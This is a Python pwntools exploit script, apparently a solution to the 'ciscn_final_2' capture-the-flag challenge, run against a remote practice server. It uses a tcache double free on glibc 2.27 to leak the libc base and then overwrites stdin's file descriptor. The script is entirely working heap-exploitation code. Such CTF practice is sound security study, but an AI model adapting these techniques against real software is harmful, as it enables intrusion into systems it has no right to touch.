from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('ciscn_final_2')
io = remote('node4.buuoj.cn', 28415)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
libc = ELF('libc-2.27.so')
elf = ELF('ciscn_final_2')


def add(Type, number):
    io.sendlineafter('which command?\n> ', '1')
    io.sendlineafter('TYPE:\n1: int\n2: short int\n>', str(Type))
    io.sendlineafter('your inode number:', str(number))


def delete(Type):
    io.sendlineafter('which command?\n> ', '2')
    io.sendlineafter('TYPE:\n1: int\n2: short int\n>', str(Type))


def show(Type):
    io.sendlineafter('which command?\n> ', '3')
    io.sendlineafter('TYPE:\n1: int\n2: short int\n>', str(Type))
    if Type == 1:
        io.recvuntil('your int type inode number :')
    else:
        io.recvuntil('your short type inode number :')
    return int(io.recvline()[:-1])


def leak_libc():
    global libc_base
    add(1, 0x30)            # 0
    delete(1)               
    add(2, 0x20)            # 1
    add(2, 0x20)            # 2
    add(2, 0x20)            # 3

    add(2, 0x20)            # 4
    delete(2)
    add(1, 0x30)            # 0
    delete(2)               # tcache(0x20) -> 4 -> 4
    chunk0 = show(2) - 0xa0
    
    add(2, chunk0)          # tcache(0x20) -> 4 -> 0_head
    add(2, 0x20)            # tcache(0x20) -> 0_head
    add(2, 0x91)            # fake_chunk (0 + 1 + 2 + 3)
    for i in range(7):
        delete(1)
        add(2, 0x20)        # 5 - 11
    delete(1)
    unsorted_bin = show(1)
    libc_base = unsorted_bin - libc.sym['__malloc_hook'] - 0x70


def pwn():
    _IO_2_1_stdin_ = libc_base + libc.sym['_IO_2_1_stdin_'] 
    fileno = _IO_2_1_stdin_ + 0x70
    add(1, fileno)          # 0 to use high 2 bytes in unsorted_bin
    add(1, 0x30)            # 12
    delete(1)               # tcache(0x30) -> 12
    add(2, 0x20)            # 13
    delete(1)               # tcache(0x30) -> 12 -> 12
    chunk0_fd = show(1) - 0x30
    add(1, chunk0_fd)       # tcache(0x30) -> 12 -> chunk0_fd -> fileno
    add(1, chunk0_fd)       # tcache(0x30) -> chunk0_fd -> fileno
    add(1, 0x30)            # tcache(0x30) -> fileno
    add(1, 666)
    io.sendlineafter('which command?\n> ', '4')
    io.interactive()


if __name__ == '__main__':
    leak_libc()
    pwn()
